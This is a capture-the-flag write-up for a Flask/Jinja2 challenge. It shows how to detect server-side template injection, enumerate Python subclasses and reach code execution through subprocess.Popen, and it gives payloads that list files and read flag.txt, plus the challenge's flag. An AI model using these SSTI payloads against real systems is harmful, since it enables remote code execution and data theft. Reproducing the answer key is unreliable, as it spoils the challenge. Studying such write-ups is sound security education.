# Challenge Name: Templates

## Description

Just a simple service made using Server Side Rendering.

**Challenge URL:** `http://chall.0xfun.org:24809/`

**Flag Format:** `0xfun{.*}`

---

## Writeup

### Step 1: Detecting SSTI

Send a test payload in the `name` parameter (e.g. `name={{ 7*7 }}`). If the response shows `49`, the app is vulnerable to Server-Side Template Injection (SSTI).

### Step 2: Confirming Jinja2 and Enumerating Classes

- `name={{ config }}` leaks the Flask config.
- `name={{ ''.__class__.__mro__[1].__subclasses__() }}` lists subclasses. Look for a useful one such as `subprocess.Popen` (index `-1` or the appropriate index in your environment).

### Step 3: RCE via Popen

Use the chosen class to run shell commands. Example (URL-encoded):

- List directory:  
  `name={{ ''.__class__.__mro__[1].__subclasses__()[-1]('ls -la', shell=True, stdout=-1).communicate() }}`
- Read flag:  
  `name={{ ''.__class__.__mro__[1].__subclasses__()[-1]('cat flag.txt', shell=True, stdout=-1).communicate() }}`

The response body contains the command output (e.g. `(b'0xfun{...}\n', None)`).

### Step 4: Extracting the Flag

Decode the response and copy the flag from the command output.

---

## Flag

```
0xfun{Server_Side_Template_Injection_Awesome}
```

---
